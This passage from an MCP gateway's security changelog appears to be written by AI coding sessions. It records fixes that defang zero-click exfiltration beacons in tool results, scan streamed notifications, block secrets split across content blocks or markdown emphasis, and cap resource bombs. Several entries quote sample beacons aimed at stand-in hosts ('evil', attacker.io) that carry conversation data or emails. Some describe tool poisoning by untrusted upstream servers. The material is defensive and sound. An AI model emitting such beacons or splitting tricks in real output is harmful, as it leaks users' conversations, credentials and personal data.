...
- **Date:** 2026-07-03
- **Severity:** HIGH (zero-click data-exfil / tool-poisoning on a distinct egress surface that bypassed the chat output guard).
...
- **WHAT (gap):** the chat output guard defangs zero-click auto-render exfil beacons (markdown-image `![x](https://evil/?d=<data>)`, bare beacon URL) via `neutralize_exfil_channels`, but the MCP tool-RESULT scan (`_scan_tool_result_floor` → orchestrator `_scan_text_tier1`) only ran `redact_all` — masking recognized PII/secrets but NOT the beacon STRUCTURE. A malicious upstream result carrying `![x](https://evil/?d=<base64-of-conversation>)` (opaque payload the regexes don't recognise) egressed as a live auto-render beacon that a markdown-rendering client AUTO-FETCHES on render → zero-click exfil. This egress BYPASSES the chat output guard (separate API surface).
- **WHY:** HARDEN 1.4 prevent MCP data leakage on the result egress; parity with the chat guard exfil defense (G40–G43).
- **NOW DOES:** (1) `_scan_text_tier1` runs `neutralize_exfil_channels` on the RAW text (so the smuggled payload is visible to `_url_smuggles_data`; running post-`redact_all` would leave the auto-render intact), adds an `exfil` finding, and sets the mutation to `redact_all(neutralized)` (if PII/secret also present) or the neutralized text; gated `enforcement != "monitor"`. (2) Since tier1 only APPLIES a mutation under a `redact` action, added `_findings_have_exfil` and OR'd it into the E12 result-redaction FLOOR's redact-trigger at all 3 sites (`_scan_tool_result_floor`, adapter tools/call, streamable-http) — the CHG-0074 pattern — so the defang fires under the default `tag` posture.
- **Touched whose work:** owning-session MCP scan core (orchestrator + CHG-0074/E12 floor); reuses `output_guard.neutralize_exfil_channels`.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py -q` → 10 passed (3 markdown-image beacons PII/secret/base64 → auto-render dropped + `[exfil-redacted]` + floor fired + `exfil` finding; bare-URL-PII defanged; 5 benign unchanged; helper). Full sweep `ai_mesh_gateway/tests` → 1568 passed, 0 failed; broker `-k "not websocket"` → 108 passed. Byte-level: `![a](.../?leak=john.doe@corp.example)` → `[a](https://attacker.io/[exfil-redacted])`. Evidence: `mcp-parallel/findings/backstop-p-result-exfil-beacon/finding.md`.
- **ORACLE NOTE:** aidefence is NOT a useful oracle here (it rated the RAW `?leak=<email>` beacon `hasPII=false` — it doesn't parse PII in a URL query, which is the exfil vector); byte-level + behavior test is authoritative.
- **RESIDUAL:** an HTML `<img src="...">`/srcset beacon nested in a JSON tool-result field is NOT defanged — `scan_mcp_payload` scans the whole JSON-serialized payload so the HTML attribute quotes are escaped (`src=\"...\"`) and the HTML regexes miss them. Markdown/bare-URL/protocol-relative beacons (the dominant LLM-rendered vector) ARE defanged; the HTML-nested-in-JSON case needs per-field (pre-serialization) neutralization — noted for a future item. → **CLOSED by CHG-0097.**

### CHG-0097 — defang HTML/SVG/CSS/srcset exfil beacons NESTED in a JSON tool result (closes CHG-0096 residual)
- **Date:** 2026-07-03
...
- **WHAT (gap):** the CHG-0096 residual — the MCP tier-1 scan target (`target_mode="entire"`) is the WHOLE result payload JSON-serialized, so HTML attribute quotes are escaped (`src=\"…\"`); `neutralize_exfil_channels`'s HTML regexes expect real quotes (`["\']?`) and the leading backslash blocks the match. Markdown (no quotes) survived JSON-serialization and defanged; HTML `<img>`/srcset/CSS `url()`/SVG `<image href>` did not → a raw-HTML-rendering client still auto-fetched the beacon (zero-click exfil).
- **WHY:** HARDEN 1.4 prevent MCP data leakage on the result egress; complete parity with the chat guard exfil defense (G40–G43).
- **NOW DOES:** `_neutralize_exfil_deep(text)` — if the tier-1 target is a JSON structure, parse it and run `neutralize_exfil_channels` on each UNESCAPED string LEAF, then re-serialize (HTML/SVG/CSS/srcset beacons defang correctly, valid JSON escaping preserved); non-JSON text neutralized directly; returns the ORIGINAL text unchanged when nothing defanged (benign result stays byte-identical). `_scan_text_tier1` calls it instead of `neutralize_exfil_channels` (the CHG-0096 exfil finding + floor-trigger wiring unchanged).
- **Touched whose work:** owning-session MCP scan core (orchestrator); completes CHG-0096.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py -q` → 18 passed (+8: HTML img/srcset/CSS/SVG beacons → `[exfil-redacted]` + host gone + exfil finding; 3 benign HTML images untouched; `_neutralize_exfil_deep` unit incl. malformed-JSON fallback). Full sweep `ai_mesh_gateway/tests` → 1576 passed, 0 failed; broker `-k "not websocket"` → 108 passed. Byte-level: `<img src="https://evil…/?d=<b64>">` → `<img src=\"[exfil-redacted]\">`; benign `<img src="https://cdn.example.com/logo.png">` unchanged. Evidence: `mcp-parallel/findings/backstop-p-result-exfil-html-nested/finding.md`.

### CHG-0098 — ext-proxy non-finite SSE stream (server notifications) egressed UNSCANNED
- **Date:** 2026-07-03
- **Severity:** HIGH (fail-open 1.4 data leak — an entire class of egress, server-pushed SSE, forwarded raw).
...
- **WHAT (gap):** `ext_mcp_proxy` buffers+scans SSE ONLY for finite methods (`_EXT_FINITE_RESULT_METHODS`). A NON-finite stream (server-pushed `notifications/*`, subscriptions, long-lived streams) was forwarded RAW (`stream_gen()` yielded `resp.aiter_bytes()` verbatim) with only a `LOG.warning("streaming_egress_unscanned")` — the stated reason being that buffering an open stream could hang/OOM. But an untrusted upstream can push sensitive data in a `notifications/message` frame's `params`, so the raw passthrough was a real, unbounded egress leak (the last unscanned MCP egress channel).
- **WHY:** HARDEN 1.4 prevent MCP data leakage on ALL egress, incl. streaming.
- **NOW DOES:** scans the stream PER EVENT with bounded memory. `_scan_reframe_sse_tool_result` gained `scan_notifications` — a notification frame (no result/error, has `params`) has its whole JSON-RPC message scanned via the result floor (reusing CHG-0093 per-event reassembly). The non-finite branch buffers only up to ONE event, scans it, and re-emits; an event exceeding `_MCP_SSE_EVENT_MAX_BYTES` (default 1 MB) without a boundary is WITHHELD fail-closed (so no unbounded buffering); a blocked (unmaskable-survivor) event is withheld with an SSE comment and the stream continues. Audited (`sse_stream_scanned`; withholds as `sse_stream_event_withheld`/`_too_large`).
- **Touched whose work:** owning-session ext passthrough (CHG-0039/0061/0064/0070/0095) + CHG-0093 reframer; updated one test another session authored (it asserted the removed raw-passthrough behavior).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_ext_sse_stream_scan.py -q` → 5 passed (secret/PII/IP notification masked + `sse_stream_scanned`; benign passthrough; multi-line-split notification reassembled+masked; unmaskable-survivor withheld; oversized event withheld). Full sweep `ai_mesh_gateway/tests` → 1581 passed, 0 failed; broker `-k "not websocket"` → 108 passed. **Byte-level:** notification `params.data` secret+PII+IP → `key AKIA****MPLE … b***@c***.example`; benign progress unchanged. **Independent oracle (aidefence):** `has_pii` false on the masked frame, true on the raw. Evidence: `mcp-parallel/findings/backstop-p-ext-sse-stream-scan/finding.md`.
...
- **WHAT (gap):** the chat output guard applies THREE render-leak neutralizers (`neutralize_exfil_channels` → `neutralize_encoded_pii` → `neutralize_markdown_split_pii` G44); CHG-0096 wired only the FIRST into the MCP result path. So a PII/secret whose chars are interleaved with inline markdown emphasis / code / HTML markers (`1**2**3-45-6789`, `AKIA**IOSFODNN7**EXAMPLE`, `4111**-1111-1111-**1111`, `1&#50;3-45-6789`) evaded the raw regexes (`tags=[]`, nothing detected) yet a markdown client STRIPS the emphasis on render and reconstructs the sensitive value — a real leak past the firewall.
- **WHY:** HARDEN 1.4 prevent MCP data leakage on the result egress; complete parity with the chat output guard's render-leak defense.
- **NOW DOES:** `_neutralize_render_leaks(text)` composes all three neutralizers (same order as `sanitize_output_for_verdict`), and `_neutralize_exfil_deep` (the CHG-0097 JSON-leaf walker) calls it on each leaf — so exfil beacons AND markdown-split/encoded PII nested in a JSON field are neutralized. A masked run becomes `[PII_REDACTED]`; the finding drives the E12 floor under the default `tag` posture (via `_findings_have_exfil`). Strict no-op on benign markdown (`**bold**`, `2*3`, `` `code` ``, `a_b_c`).
- **Touched whose work:** owning-session MCP scan core (extends CHG-0096/0097); reuses chat guard `neutralize_encoded_pii` + `neutralize_markdown_split_pii`.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py -q` → 27 passed (+9: 5 markdown/encoded-split PII/secret → `[PII_REDACTED]` + rendered no longer leaks + exfil finding + floor; 4 benign markdown untouched; all exfil-beacon tests still pass). Full sweep `ai_mesh_gateway/tests` → 1594 passed, 0 failed; broker `-k "not websocket"` → 108 passed. **Byte-level:** `The SSN is 1**2**3-45-6789 exactly` → `The SSN is [PII_REDACTED] exactly`. **Independent oracle (aidefence, on the RENDERED view):** `has_pii` true on rendered raw (`…123-45-6789…`), false on rendered fixed (`…[PII_REDACTED]…`). Evidence: `mcp-parallel/findings/backstop-p-result-markdown-split-pii/finding.md`.
- **RESIDUAL:** a secret SPLIT ACROSS content-array items (reconstructed only if a client concatenates blocks without a separator) is a related lower-confidence, client-concat-dependent vector — noted for a future item. → **CLOSED by CHG-0100.**

### CHG-0100 — secret SPLIT ACROSS content-array items evaded the tool-result scan
- **Date:** 2026-07-03
- **Severity:** MEDIUM–HIGH (fail-open 1.4 leak, client-concat-dependent; completes the split-evasion family).
...
- **WHAT (gap):** an MCP result's `content` is an ARRAY of blocks. A malicious upstream can split a secret so each half is a benign sub-pattern in adjacent blocks (`…AKIAIOSFOD` / `NN7EXAMPLE…`). The whole-payload scan sees the halves separated by JSON structure, so the value is never contiguous → nothing detected (`tags=[]`), yet a client that CONCATENATES the text blocks reconstructs it. This was the residual CHG-0099 flagged.
- **WHY:** HARDEN 1.4 field-level redaction of tool RESULTS (byte-verified, fail-closed) — the last member of the split-evasion family (SSE multi-line CHG-0093, markdown-split CHG-0099, content-array-split this).
- **NOW DOES:** `_scan_tool_result_floor` runs a cross-block check (unless per-tool `monitor` wins): `_result_has_split_secret` concatenates all content-block text and scans it for HIGH-CONFIDENCE secrets/credentials (`detect_secrets` + `detect_credential_exposure` + SECRET-tagged `detect_pii`); a kind present in the concatenation but NOT wholly inside any single block was reconstructed only by the join → fail CLOSED (block). Scoped to secrets/credentials (not generic PII) → negligible FP; a contiguous secret in one block is left to the normal redaction floor (no over-block).
- **Touched whose work:** owning-session MCP scan core; completes CHG-0093/0099.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_cross_block_split.py -q` → 8 passed (split-2-blocks blocked; split-3-blocks blocked; contiguous secret REDACTED not blocked; benign multi-block passes; single block; monitor observe-only; 2 helper units). Full sweep `ai_mesh_gateway/tests` → 1602 passed, 0 failed; broker `-k "not websocket"` → 108 passed. Behavior test is authoritative (a BLOCK decision — aidefence-as-oracle N/A, also blind to AWS-key-class). Evidence: `mcp-parallel/findings/backstop-p-result-cross-block-split/finding.md`.

### CHG-0101 — render-leak neutralization + cross-block split-block proven concurrency-safe (item-20)
- **Date:** 2026-07-03
- **Severity:** N/A (verification + regression-lock; zero defects — the guardrails hold under concurrency).
- **Files:** `gateway/ai_mesh_gateway/tests/test_mcp_scan_concurrency_safety.py` (+2 tests, test-only).
- **WHAT:** CHG-0090 proved the plaintext-redaction chain concurrency-safe but predates the render-leak neutralization (CHG-0096/0097/0099 — exfil beacons + markdown-split/encoded PII) and the cross-block split-block (CHG-0100). Those run in the HOT scan path (neutralizers via module-level compiled regexes + JSON walk; split check via pure detection over a per-result block concatenation). A race could TORN/INTERLEAVE a neutralization or CROSS-CONTAMINATE outputs — a plausible high-severity 1.4-under-load failure a single-call test can't catch.
- **WHY:** item 20 "1.4 guardrails holding under peak load" — the concurrency dimension, extended to the CHG-0096–0100 additions (the 300–500-sandbox scale stays host-blocked; concurrency-SAFETY is provable here).
- **NOW DOES:** 2 new tests fire 300 concurrent `_scan_tool_result_floor` calls across 10 orgs — (1) each with a UNIQUE benign token + UNIQUE base64 exfil beacon + a markdown-split secret → asserts the token survives, the beacon is defanged, the markdown-split does NOT reconstruct, and NO call's output contains ANY OTHER call's token (0 cross-contamination); (2) each with a valid AWS key split across two content blocks → asserts ALL 300 blocked with `cross_block_split_secret` meta. RESULT: 0 lost tokens / 0 surviving beacons / 0 reconstructed secrets / 0 cross-contamination; 300/300 splits blocked.
- **Touched whose work:** none (test-only); backstops the CHG-0096–0100 hot-path additions.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_scan_concurrency_safety.py -q` → 4 passed (2 CHG-0090 + 2 CHG-0101). Full sweep → 1604 passed, 0 failed; broker `-k "not websocket"` → 108 passed. Evidence: `mcp-parallel/findings/backstop-p20-render-leak-concurrency/finding.md`.
- **HONESTY NOTE:** proves concurrency-SAFETY of the render-leak + split-block guardrails, NOT the full 300–500-sandbox / 5k–10k live stress (items 14–20) — still host-blocked, owned by the live load harnesses.

### CHG-0102 — bound the CHG-0100 cross-block split-check cost (resource-bomb containment)
- **Date:** 2026-07-03
- **Severity:** MEDIUM (DoS-amplification self-correction; no leak — corrects a perf regression from CHG-0100).
...
- **WHAT (gap):** a resource-bomb probe (item 16) found the scan fails CLOSED on a JSON bomb (deeply-nested → `SCAN_ERROR` block) but is slow on large results — a 5 MB multi-block result took ~9 s, of which `_result_has_split_secret` (CHG-0100) alone was ~3 s: it concatenated ALL content-block text (`"".join(texts)`) and ran 3 detector passes over the full O(total_text) concatenation. Under 5k–10k concurrent, that 3 s/large-result amplification is a real DoS vector I introduced.
- **WHY:** HARDEN item 16 "resource bombs contained" — the split-check must not amplify the large-result scan cost.
- **NOW DOES:** a secret/credential token is short, so a cross-block split only spans a boundary within `_MCP_SPLIT_SECRET_SPAN` (default 512, env). `_boundary_concat` trims each block to its boundary regions (a block ≤ 2×span kept whole; a longer one keeps first-span + `\n\x00\n` sentinel + last-span, dropping the interior which the full-text scan already covers for CONTIGUOUS secrets). `_result_has_split_secret` scans `_boundary_concat(texts)` → cost O(num_blocks × span), not O(total_text).
- **Touched whose work:** self-correction of CHG-0100.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_cross_block_split.py -q` → 9 passed. Full sweep → 1605 passed, 0 failed; broker `-k "not websocket"` → 108 passed. **Perf:** 5 MB multi-block split-check 3.03 s → **0.378 s** (~8×). **Correctness unchanged:** 2-way / 3-way / huge-left-boundary splits still caught; contiguous-in-long-interior NOT falsely flagged; benign passes. Evidence: `mcp-parallel/findings/backstop-p16-split-check-dos-bound/finding.md`.
- **RESIDUAL:** a >512-char secret (e.g. a long JWT) split so a fragment lands in a long block's trimmed interior could be missed (extreme; span is env-tunable; the full-text scan still catches any contiguous long secret). The pre-existing ~10 s detect cost on a 9 MB single block is a separate product-level trade-off, unchanged. → the event-loop-blocking part is fixed by **CHG-0103**.

### CHG-0103 — the MCP Tier-1 scan blocked the event loop (severe DoS under load)
- **Date:** 2026-07-03
- **Severity:** HIGH (availability / DoS — a single large result froze every concurrent request on the worker).
- **Files:** `gateway/ai_mesh_gateway/mcp_scan_orchestrator.py` (`_scan_text_tier1` → `_scan_text_tier1_sync` + offloading async wrapper); `gateway/ai_mesh_gateway/tests/test_mcp_tier1_offload.py` (new).
- **WHAT (gap):** `_scan_text_tier1` was `async def` but its body is PURE SYNC CPU (detect_pii/secrets/ip/cred — each a loop of `re.search` — + redact_all + encoded-exfil loop + render-leak neutralizers), NO `await`. So it ran INLINE on the event loop. A large tool result (up to the 10 MB cap) is seconds of CPU (detect_pii ~2.6 s on 8 MB; whole Tier-1 ~5–10 s) → it BLOCKS the loop, freezing EVERY other concurrent request on the worker. Measured: an 8 MB scan stalled a trivial `sleep(0.05)` coroutine **9.67 s**. An untrusted upstream triggers it with one crafted result.
- **WHY:** HARDEN item 16 "resource bombs contained" + item 20 "1.4 under peak load" — a large scan must not block the loop.
- **NOW DOES:** split into a pure-CPU sync `_scan_text_tier1_sync` (unchanged body) + an async wrapper `_scan_text_tier1` (same signature) that offloads to a worker thread via `asyncio.to_thread` when the text exceeds `_TIER1_OFFLOAD_THRESHOLD` (64 KB, env `MCP_TIER1_OFFLOAD_BYTES`); small inputs run inline (sub-ms; offloading would only add thread-pool pressure). The `re` loop releases the GIL between patterns → the thread keeps the loop responsive. Measured after: the 8 MB scan stalls the coroutine only **~0.2 s**; the secret is still masked (correctness preserved through the thread).
- **Touched whose work:** owning-session MCP scan core (pre-existing gap — the chat scanner already offloads via `run_in_executor`; the MCP Tier-1 did not).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_tier1_offload.py -q` → 4 passed (large offloads + still masked; small inline + still masked; threshold env-configurable; sync/async split). Full sweep `ai_mesh_gateway/tests` → 1609 passed, 0 failed; broker `-k "not websocket"` → 108 passed. All prior Tier-1 tests still pass (wrapper keeps the async signature). Evidence: `mcp-parallel/findings/backstop-p16-tier1-event-loop-block/finding.md`.
- **RESIDUAL:** the total CPU cost of a very large scan (~10 s for 9 MB) is unchanged — it just no longer blocks the loop; capping that cost is a separate product-level trade-off.

### CHG-0104 — content-block-count resource limit (many-tiny-block bomb; byte cap missed it)
- **Date:** 2026-07-03
- **Severity:** MEDIUM (resource-bomb / availability; the byte cap did not catch a many-block result).
- **Files:** `gateway/ai_mesh_gateway/mcp_proxy.py` (`_MCP_MAX_CONTENT_BLOCKS` + fail-closed check in `_scan_tool_result_floor`); `gateway/ai_mesh_gateway/tests/test_mcp_result_block_count_cap.py` (new).
- **WHAT (gap):** the 10 MB response byte cap does NOT stop a many-tiny-block bomb — ~50k blocks × ~200 B is ~3–10 MB (UNDER the byte cap) — which reaches the scan and amplifies cost across every per-block loop (JSON serialize, scan-target extraction, tool filtering), stalling the event loop ~0.8 s (the residual after CHG-0103; NOT the detect scan (offloaded) nor the split-check (a warm A/B showed offloading it made no difference — it wasn't the bottleneck), but the inline many-object JSON/loop overhead). A resource limit on the NUMBER of content blocks was missing alongside the byte limit.
- **WHY:** HARDEN item 16 "CPU/mem limits — resource bombs contained".
- **NOW DOES:** `_scan_tool_result_floor` fails CLOSED (blocks) when a result has more than `_MCP_MAX_CONTENT_BLOCKS` (default 10000, env `MCP_MAX_CONTENT_BLOCKS`) content blocks — an O(1) `len()` check BEFORE the expensive scan, so a bomb costs nothing and never reaches the per-block loops. A per-tool `monitor` stays observe-only. Handles `{"content":[…]}` and a bare block list. Default 10000 ≫ any realistic legit result.
- **Touched whose work:** owning-session MCP scan core; complements CHG-0103.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_block_count_cap.py -q` → 7 passed (over-cap fail-closed + meta/tag; at-cap allowed; bare list capped; normal unaffected + masked; monitor observe-only; string result unaffected; cap env-configurable). Full sweep `ai_mesh_gateway/tests` → 1620 passed, 0 failed; broker `-k "not websocket"` → 108 passed. Behavior: a 50k-block bomb → blocked in dt=0.000 s, MAX loop gap 0.000 s (was ~0.8 s). Evidence: `mcp-parallel/findings/backstop-p16-content-block-count-cap/finding.md`.
- **HONESTY NOTE:** first tried offloading the split-check to a thread (like CHG-0103) but a warm A/B showed no benefit (0.80 s inline vs 0.84 s offloaded) → REVERTED and landed on this block-count cap, which addresses the actual cost at O(1). No content leak → no aidefence oracle.

### CHG-0105 — internal (chat→MCP) route returned stdio/websocket tool RESULTS UNSCANNED
- **Date:** 2026-07-03
- **Severity:** HIGH (fail-open 1.4 leak — an entire call path egressed raw tool results to the LLM).
...
- **WHAT (gap):** `internal_tools_call` (the `X-Gateway-Internal-Key` route the CHAT pipeline calls to run an MCP tool for a user) scans the RESULT only on the streamable-http path (`_scan_internal_result`). On the SANDBOX transports (`stdio`/`websocket`) it returned the raw `_adapter_forward(...)` response DIRECTLY — NO result scan. So a secret / PII / internal-IP / exfil-beacon / markdown-split value in a stdio/ws tool result egressed to the chat pipeline → LLM context UNREDACTED, while the SAME tool via `org_mcp_jsonrpc` (CHG-0091) is scanned. Confirmed: a stdio result with `AKIAIOSFODNN7EXAMPLE` + `bob@corp.example` + `![x](https://evil…)` egressed all three raw.
- **WHY:** HARDEN 1.4 field-level redaction of tool RESULTS (byte-verified, fail-closed) — a transport-path parity gap left an entire egress path unscanned.
- **NOW DOES:** the sandbox branch buffers the adapter response and (error-envelope aware, CHG-0091) scans the whole `result` OR a bare `error` envelope via `_scan_tool_result_floor` — ALL the hardened machinery applies (secret/PII/IP redaction, render-leak neutralization CHG-0096-0100, split-check, block-count cap); swaps in the masked result, fails CLOSED (block error) on an unmaskable survivor, and AUDITS block/redact (`transport="internal_sandbox"`). Full parity with the org path.
- **Touched whose work:** owning-session proxy `internal_tools_call`.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_internal_sandbox_result_scan.py -q` → 5 passed (secret+PII masked + redact audited; exfil beacon defanged; error-envelope secret masked; unmaskable → block; benign unchanged). Full sweep `ai_mesh_gateway/tests` → 1625 passed, 0 failed; broker `-k "not websocket"` → 108 passed. **Byte-level:** `user alice.jones@corp.example ssn 123-45-6789` → `user a***@c***.example ssn ***-**-6789`. **Independent oracle (aidefence):** `has_pii` false on the fixed egress, true on the raw. Evidence: `mcp-parallel/findings/backstop-p-internal-sandbox-result-unscanned/finding.md`.
- **RESIDUAL:** the internal streamable-http path's `_scan_internal_result` scans only `result.content` (not a bare error frame / `structuredContent`) — a narrower residual than the sandbox complete-skip fixed here; noted for a follow-up. **→ closed by CHG-0106.**
...
- **WHAT (gap):** closes the CHG-0105 residual. `_scan_internal_result` — the outbound result scanner on `internal_tools_call`'s LEGACY direct-httpx path (reached when `MCP_HTTP_VIA_SANDBOX=0`, `_is_sandbox_routed`→False; the default routes ALL transports through the sandbox and is covered by CHG-0105) — scanned only `result_obj.get("content")`. If `result.content` was `None` it returned the reply **UNSCANNED**. So a secret / PII / internal-IP in an upstream JSON-RPC **error frame** (`error.message`) or a **`structuredContent`-only** result egressed **RAW** to the chat pipeline → LLM. Byte-verified pre-fix on the legacy path: an error frame carrying `AKIAIOSFODNN7EXAMPLE` + `10.1.2.3` + `bob.jones@corp.example` egressed all three raw; a `structuredContent`-only result carrying an AWS key + SSN egressed both raw. It also **silently swapped** masked content with **no audit event** on the redact.
- **WHY:** HARDEN 1.4 field-level redaction of tool RESULTS (byte-verified, fail-closed) — a legacy-path parity gap; a debug fallback must not be a weaker leak posture than production.
- **NOW DOES:** error-envelope aware WHOLE-result scan (mirrors the sandbox branch CHG-0105 + org path CHG-0091). Scans `resp_obj["result"]` when present (so `content` **and** `structuredContent` **and** a bare string/list result are all covered) else the bare error envelope, via `_scan_tool_result_floor` (redaction + render-leak neutralization + split-check + block-count cap all apply). Swaps in the masked payload, blocks fail-closed on an unmaskable survivor, and **AUDITS the redact** (`decision="redact"`, `transport="internal"`) — closing the prior audit omission. Full parity across all three result-egress paths.
- **Touched whose work:** owning-session proxy `internal_tools_call` (`_scan_internal_result`); completes the CHG-0105 follow-up.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_internal_http_result_scan.py -q` → 5 passed (error-frame secret+IP+PII masked; structuredContent-only masked + redact audited; content control still masked; redact audited; benign preserved). Full sweep `ai_mesh_gateway/tests` → 1649 passed, 0 failed; broker `-k "not websocket"` → 108 passed. **Byte-level (legacy path, `MCP_HTTP_VIA_SANDBOX=0`):** error frame → `key=AKIA****MPLE host [INTERNAL_IPV4_REDACTED] user b***@c***.example`; structuredContent → `"secret":"***","ssn":"***-**-6789"`. **Independent oracle (aidefence):** `has_pii` **true** on the raw error-frame egress, **false** on the fixed. Evidence: `mcp-parallel/findings/backstop-p-internal-http-result-scan/finding.md`.

### CHG-0107 — stdio spawn-arg log leak: URL-embedded credentials logged plaintext (both consumers)
- **Date:** 2026-07-03
- **Scratchpad item:** G4 item 13 (observability / log hygiene) — closes the CHG-0053 FOLLOW-UP.
- **Severity:** MEDIUM (1.4 credential leak to OPERATOR LOGS — a secret in a stdio server's args/URL landed in plaintext log lines; not a provider/LLM egress but a real secondary leak sink).
- **Files:** `shared/ai_mesh_shared/mcp_stdio_common.py` (new `_safe_args_for_log` + `_redact_url_creds` + `_SECRET_ARG_HINTS`) · `gateway/ai_mesh_gateway/mcp_stdio_adapter.py` (import + spawn-log site) · `services/mcp-broker/sandbox-image/agent/stdio_manager.py` (import shared; removed the local duplicate) · `services/mcp-broker/tests/test_stdio_common.py` (+12) · `services/mcp-broker/sandbox-image/agent/tests/test_stdio_manager_packages.py` (+2) · `gateway/ai_mesh_gateway/tests/test_mcp_stdio_adapter_branch.py` (+1).
- **WHAT (gap):** the stdio-spawn log line (`Starting stdio MCP process: <cmd> <args> ...`) had TWO defects. (a) CHG-0053 added `_safe_args_for_log` masking secret-FLAG values (`--token X` / `--api-key=X`) but ONLY on the sandbox agent; a credential embedded in a URL passed as a STANDALONE arg (`postgres://u:pw@h/db` · `https://x-access-token:ghp_…@github` · `https://h/mcp?api_key=…&token=…`) still egressed RAW. (b) The GATEWAY adapter (`mcp_stdio_adapter.py:426`) logged args with NO masking at ALL — both flag-secrets AND URL creds plaintext. Byte-verified pre-fix: all four URL-cred forms + `--token XYZ` egressed verbatim through the gateway path; the four URL forms egressed through the sandbox path.
- **WHY:** HARDEN 1.4 (prevent MCP data leakage) — operator logs are a secret sink; the fix was partial (one deployable, flag-only). Root cause: two divergent copies of the log-hygiene helper.
- **NOW DOES:** ONE hardened `_safe_args_for_log` lives in the SHARED module (imported by BOTH the gateway adapter and the vendored sandbox agent — Dockerfile COPYs `shared/…/mcp_stdio_common.py`). It masks secret-flag values AND, via `_redact_url_creds`, the WHOLE URL userinfo (`scheme://***@host` — token can sit in user OR password position) and the values of secret-named query params (`?api_key=***&token=***&page=2`, non-secret params preserved), for standalone args AND non-secret `--flag=URL` inline values. Fail-safe (never raises on a malformed URL — logging must not crash the spawn path). Both spawn-log sites now redact identically.
- **Touched whose work:** the shared stdio-common module + the gateway `mcp_stdio_adapter` (backstop-only add) + the sandbox agent `stdio_manager` (dedup its CHG-0053 local copy into shared). Corrects the CHG-0053 follow-up (sandbox-only, flag-only) omission.
- **VERIFY:** shared `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_stdio_common.py -q -k "SafeArgs or RedactUrl"` → 12 passed; broker `tests -k "not websocket"` → 120 passed; sandbox agent `PYTHONPATH=…/shared ../../.venv/bin/python -m pytest tests/test_stdio_manager_packages.py -q` → 33 passed; gateway `./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_stdio_adapter_branch.py -q` → 6 passed, full `ai_mesh_gateway/tests` → 1663 passed, 0 failed. **Byte-level:** `postgres://admin:S3cr3tPass@db.internal:5432/prod` → `postgres://***@db.internal:5432/prod`; `https://x-access-token:ghp_…@github.com` → `https://***@github.com`; `?api_key=AKIA…&token=abc&page=2` → `?api_key=***&token=***&page=2`; benign URL + pkgspec + `--token`/`--api-key` controls all correct. **Independent oracle (aidefence_scan):** `piiFound` **true** on the raw postgres spawn-log line, **false** on the masked line (aidefence is blind to the AWS-key/URL-query class, so byte-level is authoritative there — masking uses `urlsplit` string ops, independent of the detection regexes). Evidence: `mcp-parallel/findings/backstop-p13-stdio-arg-url-cred-log-leak/finding.md`.

### CHG-0108 — internal tool-DISCOVERY route returned upstream tools/list metadata UNSCANNED (tool-poisoning / metadata-leak)
- **Date:** 2026-07-03
- **Scratchpad item:** G2 item 3b-adjacent / 1.4 tool-metadata leak surface (parity with CHG-0077/0079/0092).
- **Severity:** MEDIUM–HIGH (1.4 leak + tool-poisoning: an UNTRUSTED upstream MCP server's tool metadata was synced into the catalog + shown to the LLM unredacted).
...
- **WHAT (gap):** `internal_discover_tools` (the `X-Gateway-Internal-Key` route the backend uses to SYNC an MCP server's tool catalog) returned the upstream `tools/list` **RAW** on BOTH paths — the sandbox branch (`return await _adapter_forward(...)`) and the direct-httpx branch (`return JSONResponse(json.loads(data_str))` / `tools_resp.json()`). Tool DESCRIPTIONS / names / inputSchema come LIVE from an untrusted upstream MCP server and are synced into the catalog + shown to the model. So a secret / PII / internal-IP (or a CHG-0076 encoded-exfil payload) embedded in a tool description egressed to the backend/LLM unredacted — while `org_mcp_jsonrpc` tools/list (CHG-0077/0092), the REST `org_mcp_tools_list` (CHG-0079), AND the external proxy all scan tool metadata. A pure discovery-path parity gap (the poison enters at SYNC time, upstream of the runtime scan). Byte-verified pre-fix: a tool description carrying `AKIAIOSFODNN7EXAMPLE` + `bob.jones@corp.example` + `10.9.8.7` egressed all three raw on both paths.
- **WHY:** HARDEN 1.4 — field-level redaction of tool RESULTS/metadata (byte-verified, fail-closed) + tool-poisoning defense; one tools/list path (the discovery/sync origin) was left unscanned.
- **NOW DOES:** a new `_scan_internal_tools_list` helper scans the discovered payload before returning it — tools-shaped result → reuse `_scanned_tools_list_response` (mask a maskable metadata leak; fail-closed BLOCK poisoned/unmaskable metadata; audit block/redact); a bare ERROR ENVELOPE → scan the whole payload via `_scan_tool_result_floor` (CHG-0092 parity) + audit. Wired into all three `internal_discover_tools` return points (sandbox adapter buffer+scan; direct SSE; direct JSON). Fetches `enabled_info` so a server's `monitor` override is respected. Descriptions are not actor-scoped → `actor=None` (matches the org tools/list scan). Full parity across every tools/list egress path.
- **Touched whose work:** the owning-session proxy `internal_discover_tools` (the backend tool-sync route); extends CHG-0077/0079/0092 tool-metadata scanning to the discovery path.
